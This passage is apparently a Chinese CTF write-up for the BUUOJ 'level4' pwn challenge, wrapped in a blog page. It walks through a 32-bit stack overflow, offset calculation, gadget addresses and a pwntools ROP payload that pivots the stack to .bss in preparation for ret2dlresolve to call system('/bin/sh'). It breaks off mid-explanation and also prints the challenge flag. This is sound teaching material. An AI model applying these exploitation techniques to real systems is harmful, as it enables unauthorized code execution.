@@ -1,0 +1,1081 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.36d0987006a4b9c3341e62a9e55cd9446b790bd2367575177aa5d794949c7cf0.js" integrity="sha256-NtCYcAakucM0HmKp5VzZRGt5C9I2dXUXeqXXlJScfPA=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>codex - 微风的龙</title>
+    <link rel="icon" href="/favicon_hu_912579ba8553ef86.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_220d0e60e04d07f1.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_e404a0b940aa1839.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_603e3ce51eff6377.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_149e475083d0f0f9.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="博客, Hugo, PWN, BUUOJ, 个人主页" />
+  <meta name="description" content="level4 详细 WP
+
+题目信息
+
+题目文件：level4
+远程环境：node5.buuoj.cn:28980
+程序类型：32-bit ELF
+目标：利用程序漏洞拿到 shell，并读取 flag
+
+最终拿到的 flag：" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="codex">
+  <meta name="twitter:description" content="level4 详细 WP题目信息题目文件：level4 远程环境：node5.buuoj.cn:28980 程序类型：32-bit ELF 目标：利用程序漏洞拿到 shell，并读取 flag 最终拿到的 flag：">
+<meta property="og:url" content="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-2/codex/">
+  <meta property="og:site_name" content="微风的龙">
+  <meta property="og:title" content="codex">
+  <meta property="og:description" content="level4 详细 WP题目信息题目文件：level4 远程环境：node5.buuoj.cn:28980 程序类型：32-bit ELF 目标：利用程序漏洞拿到 shell，并读取 flag 最终拿到的 flag：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="buu">
+    <meta property="article:published_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:tag" content="BUU">
+
+  <meta itemprop="name" content="codex">
+  <meta itemprop="description" content="level4 详细 WP题目信息题目文件：level4 远程环境：node5.buuoj.cn:28980 程序类型：32-bit ELF 目标：利用程序漏洞拿到 shell，并读取 flag 最终拿到的 flag：">
+  <meta itemprop="datePublished" content="2026-04-16T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-16T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2605">
+  <meta itemprop="keywords" content="BUU">
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.db20b90f1e018f02fe452451fb9603d42007e5f5abc40cd58ddadfec0d7764f3.css" integrity="sha256-2yC5Dx4BjwL+RSRR+5YD1CAH5fWrxAzVjdrf7A13ZPM=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="https://weifengdel0ng.github.io/css/home.css" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+</head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-xxl">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://weifengdel0ng.github.io/">微风的龙
+</a>
+
+    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">微风的龙</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
+        <hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/">首页
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/posts/">文章
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/about/">关于
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-xxl-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="搜索"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-xxl-none">配色</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="蓝色"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="蓝灰色"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="棕色"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="青色"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="绿色"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="靛青色"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="橙色"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="粉色"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="紫色"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="红色"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="蓝绿色"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="黄色"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-xxl-none">模式</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> 浅色
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> 深色
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> 自动
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.f7179afb1166ccce2102740afe4caf205dbc623896eb19a268f6cb9367e6eea6.js" integrity="sha256-9xea&#43;xFmzM4hAnQK/kyvIF28YjiW6xmiaPbLk2fm7qY=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">你的浏览器不支持 JavaScript。</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="目录">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="目录">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="版权">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="评论">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="切换侧边栏">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">codex</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="创建于 2026-04-16 08:00:00 &#43;0800 CST。">April 16, 2026</span><span class="post-reading-time me-1 mb-1">6 分钟阅读</span><a href="/categories/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>BUU</a><a href="/tags/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">BUU</a>
+</div>
+
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">目录</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="level4-详细-wp" data-numberify>level4 详细 WP<a class="anchor ms-1" href="#level4-详细-wp"></a></h1>
+
+<h2 id="题目信息" data-numberify>题目信息<a class="anchor ms-1" href="#题目信息"></a></h2>
+<ul>
+<li>题目文件：<code>level4</code></li>
+<li>远程环境：<code>node5.buuoj.cn:28980</code></li>
+<li>程序类型：<code>32-bit ELF</code></li>
+<li>目标：利用程序漏洞拿到 shell，并读取 flag</li>
+</ul>
+<p>最终拿到的 flag：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{7615020a-7615-462f-8ed9-00f7f5f2f16f}
+</span></span></code></pre></div><hr>
+
+<h2 id="一程序分析" data-numberify>一、程序分析<a class="anchor ms-1" href="#一程序分析"></a></h2>
+<p>先看程序保护：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Arch:       i386-32-little
+</span></span><span style="display:flex;"><span>RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>Stack:      No canary found
+</span></span><span style="display:flex;"><span>NX:         NX enabled
+</span></span><span style="display:flex;"><span>PIE:        No PIE (0x8048000)
+</span></span><span style="display:flex;"><span>Stripped:   No
+</span></span></code></pre></div><p>可以得到几个关键信息：</p>
+<ul>
+<li><code>32位程序</code></li>
+<li><code>无 Canary</code>，说明栈溢出后不需要绕过栈保护</li>
+<li><code>NX 开启</code>，说明不能直接在栈上执行 shellcode</li>
+<li><code>No PIE</code>，说明程序基址固定，ROP 地址稳定</li>
+<li><code>Partial RELRO</code>，GOT 仍有一定利用价值</li>
+</ul>
+<p>这类题的常规思路就是：</p>
+<ol>
+<li>找到栈溢出点</li>
+<li>由于 <code>NX</code> 开启，转而使用 <code>ROP</code></li>
+<li>如果没有现成 <code>system</code>、<code>/bin/sh</code>，就考虑：
+<ul>
+<li>泄漏 libc 后 ret2libc</li>
+<li>或者直接 <code>ret2dlresolve</code></li>
+</ul>
+</li>
+</ol>
+<p>这题非常适合 <code>ret2dlresolve</code></p>
+<hr>
+
+<h2 id="二漏洞点分析" data-numberify>二、漏洞点分析<a class="anchor ms-1" href="#二漏洞点分析"></a></h2>
+<p>关键函数反汇编如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804844b:	<span style="color:#a6e22e">push</span>	<span style="color:#66d9ef">ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804844c:	<span style="color:#a6e22e">mov</span>	<span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804844e:	<span style="color:#a6e22e">sub</span>	<span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">0x88</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048454:	<span style="color:#a6e22e">sub</span>	<span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048457:	<span style="color:#a6e22e">push</span>	<span style="color:#ae81ff">0x100</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804845c:	<span style="color:#a6e22e">lea</span>	<span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">ebp</span> - <span style="color:#ae81ff">0x88</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048462:	<span style="color:#a6e22e">push</span>	<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048463:	<span style="color:#a6e22e">push</span>	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048465:	<span style="color:#a6e22e">call</span>	<span style="color:#ae81ff">0x8048310</span>        <span style="color:#75715e">; read
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804846a:	<span style="color:#a6e22e">add</span>	<span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804846d:	<span style="color:#a6e22e">nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804846e:	<span style="color:#a6e22e">leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804846f:	<span style="color:#a6e22e">ret</span>
+</span></span></code></pre></div><p>这段逻辑很清楚：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x88</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100</span>);
+</span></span></code></pre></div><p>问题在于：</p>
+<ul>
+<li>栈上只分配了 <code>0x88</code> 字节</li>
+<li>却读入了 <code>0x100</code> 字节</li>
+</ul>
+<p>因此存在<strong>明显的栈溢出</strong></p>
+<hr>
+
+<h2 id="三覆盖偏移计算" data-numberify>三、覆盖偏移计算<a class="anchor ms-1" href="#三覆盖偏移计算"></a></h2>
+<p>局部变量大小是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>buf = 0x88
+</span></span><span style="display:flex;"><span>saved ebp = 4
+</span></span></code></pre></div><p>所以返回地址偏移为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>offset = 0x88 + 4 = 0x8c
+</span></span></code></pre></div><p>即：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p>只要输入超过 <code>0x8c</code> 字节，就可以控制返回地址。</p>
+<hr>
+
+<h2 id="四为什么选择-ret2dlresolve" data-numberify>四、为什么选择 ret2dlresolve<a class="anchor ms-1" href="#四为什么选择-ret2dlresolve"></a></h2>
+<p>这题导入的函数很少，主要有：</p>
+<ul>
+<li><code>read</code></li>
+<li><code>write</code></li>
+</ul>
+<p>如果走传统 <code>ret2libc</code>，通常需要：</p>
+<ol>
+<li>先泄漏某个 libc 地址</li>
+<li>再次构造 payload 回到程序</li>
+<li>计算 libc base</li>
+<li>调用 <code>system(&quot;/bin/sh&quot;)</code></li>
+</ol>
+<p>但这题本身很适合 <code>ret2dlresolve</code>，因为：</p>
+<ul>
+<li>程序是动态链接</li>
+<li>有 <code>plt[0]</code></li>
+<li>有 <code>.rel.plt</code>、<code>.dynsym</code>、<code>.dynstr</code></li>
+<li>可以伪造重定位条目和符号表项</li>
+<li>直接让动态链接器帮我们解析 <code>system</code></li>
+</ul>
+<p>这样就不依赖远程 libc 版本，做起来更稳。</p>
+<hr>
+
+<h2 id="五利用思路总览" data-numberify>五、利用思路总览<a class="anchor ms-1" href="#五利用思路总览"></a></h2>
+<p>整体分两阶段：</p>
+
+<h3 id="第一阶段" data-numberify>第一阶段<a class="anchor ms-1" href="#第一阶段"></a></h3>
+<p>利用栈溢出，构造 ROP：</p>
+<ol>
+<li>调用 <code>read(0, base_stage, 100)</code><br>
+把第二阶段 payload 读入 <code>.bss</code></li>
+<li>将 <code>ebp</code> 改为 <code>.bss</code> 上的新栈地址</li>
+<li>执行 <code>leave; ret</code> 完成<strong>栈迁移</strong></li>
+</ol>
+
+<h3 id="第二阶段" data-numberify>第二阶段<a class="anchor ms-1" href="#第二阶段"></a></h3>
+<p>在 <code>.bss</code> 上伪造：</p>
+<ul>
+<li><code>Elf32_Rel</code></li>
+<li><code>Elf32_Sym</code></li>
+<li>字符串 <code>&quot;system\x00&quot;</code></li>
+</ul>
+<p>再通过调用 <code>plt[0]</code> 触发动态解析，最终等价于调用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span></code></pre></div><p>拿到 shell 后执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat flag
+</span></span></code></pre></div><hr>
+
+<h2 id="六关键地址整理" data-numberify>六、关键地址整理<a class="anchor ms-1" href="#六关键地址整理"></a></h2>
+<p>从程序中可得到：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>read_plt    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048310</span>
+</span></span><span style="display:flex;"><span>write_got   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a018</span>
+</span></span><span style="display:flex;"><span>plt_0       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048300</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop3_ret    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048509</span>
+</span></span><span style="display:flex;"><span>pop_ebp_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804850b</span>
+</span></span><span style="display:flex;"><span>leave_ret   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080483b8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>bss        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a024</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>rel<span style="color:#f92672">.</span>plt    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080482b0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>dynsym     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080481cc</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>dynstr     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804822c</span>
+</span></span></code></pre></div><p>其中 gadget 对应关系：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x8048509: <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804850a: <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">edi</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804850b: <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x804850c: <span style="color:#a6e22e">ret</span>
+</span></span></code></pre></div><p>所以 <code>0x08048509</code> 可以当作连续弹 3 个参数的 gadget 来使用。</p>
+<hr>
+
+<h2 id="七第一阶段栈迁移" data-numberify>七、第一阶段：栈迁移<a class="anchor ms-1" href="#七第一阶段栈迁移"></a></h2>
+
+<h3 id="1-为什么要栈迁移" data-numberify>1. 为什么要栈迁移<a class="anchor ms-1" href="#1-为什么要栈迁移"></a></h3>
+<p>第一次 <code>read</code> 最多只能输入 <code>0x100</code> 字节，空间有限，不太适合塞完整的 <code>ret2dlresolve</code> 伪造结构。</p>
+<p>因此更稳的做法是：</p>
+<ul>
+<li>第一阶段只负责“搭桥”</li>
+<li>第二阶段把完整结构写到 <code>.bss</code></li>
+<li>再把栈切换过去</li>
+</ul>
+
+<h3 id="2-第一阶段-rop" data-numberify>2. 第一阶段 ROP<a class="anchor ms-1" href="#2-第一阶段-rop"></a></h3>
+<p>构造如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset,
+</span></span><span style="display:flex;"><span>    p32(read_plt),        <span style="color:#75715e"># read(0, base_stage, 100)</span>
+</span></span><span style="display:flex;"><span>    p32(pop3_ret),
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>    p32(base_stage),
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#ae81ff">100</span>),
+</span></span><span style="display:flex;"><span>    p32(pop_ebp_ret),     <span style="color:#75715e"># ebp = base_stage</span>
+</span></span><span style="display:flex;"><span>    p32(base_stage),
+</span></span><span style="display:flex;"><span>    p32(leave_ret)        <span style="color:#75715e"># esp = ebp; ret</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>逻辑解释：</p>
+
+<h4 id="第一步调用-read" data-numberify>第一步：调用 read<a class="anchor ms-1" href="#第一步调用-read"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, base_stage, <span style="color:#ae81ff">100</span>)
+</span></span></code></pre></div><p>把第二阶段内容写到 <code>.bss</code></p>
+
+<h4 id="第二步修改-ebp" data-numberify>第二步：修改 ebp<a class="anchor ms-1" href="#第二步修改-ebp"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebp</span> <span style="color:#75715e">; ret
+</span></span></span></code></pre></div><p>令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ebp = base_stage
+</span></span></code></pre></div>
+<h4 id="第三步leave-ret" data-numberify>第三步：leave; ret<a class="anchor ms-1" href="#第三步leave-ret"></a></h4>
+<p><code>leave</code> 等价于：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebp</span>
+</span></span></code></pre></div><p>于是栈就被迁移到 <code>.bss</code> 区域了，之后程序会从 <code>.bss</code> 上继续取返回地址和参数。</p>
+<hr>
+
+<h2 id="八第二阶段ret2dlresolve-原理" data-numberify>八、第二阶段：ret2dlresolve 原理<a class="anchor ms-1" href="#八第二阶段ret2dlresolve-原理"></a></h2>
+<p><code>ret2dlresolve</code> 的核心思想是：</p>
+<blockquote>
+<p>手工伪造动态链接器需要的结构体，让解析器帮我们把 <code>system</code> 解析出来。</p>
+</blockquote>
+<p>动态链接时，PLT 会借助以下几个区域：</p>
+<ul>
+<li><code>.plt</code></li>
+<li><code>.rel.plt</code></li>
+<li><code>.dynsym</code></li>
+<li><code>.dynstr</code></li>
+</ul>
+<p>当程序调用某个未解析函数时，会进入 <code>plt[0]</code>，然后动态链接器根据重定位表去解析真正地址。</p>
+<p>如果我们能伪造一个假的重定位项和假的符号表项，再让解析器去处理它，就能让它帮我们解析出 <code>system</code>。</p>
+<hr>
+
+<h2 id="九ret2dlresolve-需要伪造什么" data-numberify>九、ret2dlresolve 需要伪造什么<a class="anchor ms-1" href="#九ret2dlresolve-需要伪造什么"></a></h2>
+
+<h3 id="1-伪造重定位表项-elf32_rel" data-numberify>1. 伪造重定位表项 Elf32_Rel<a class="anchor ms-1" href="#1-伪造重定位表项-elf32_rel"></a></h3>
+<p><code>Elf32_Rel</code> 大小 8 字节：</p>
